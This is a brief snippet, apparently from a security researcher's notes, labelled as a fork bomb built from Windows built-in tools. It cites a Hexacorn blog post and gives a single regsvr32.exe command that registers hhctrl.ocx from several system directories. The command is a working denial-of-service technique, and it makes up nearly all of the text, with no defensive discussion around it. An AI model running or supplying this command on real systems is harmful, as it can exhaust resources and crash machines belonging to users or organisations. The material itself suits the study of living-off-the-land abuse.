
fork-bomb using windows builtin tools. https://www.hexacorn.com/blog/2023/12/28/1-little-known-secret-of-regsvr32-exe-take-three/

```cmd
regsvr32.exe /s c:\WINDOWS\system32\hhctrl.ocx c:\WINDOWS\syswow64\hhctrl.ocx c:\WINDOWS\sysnative\hhctrl.ocx
```
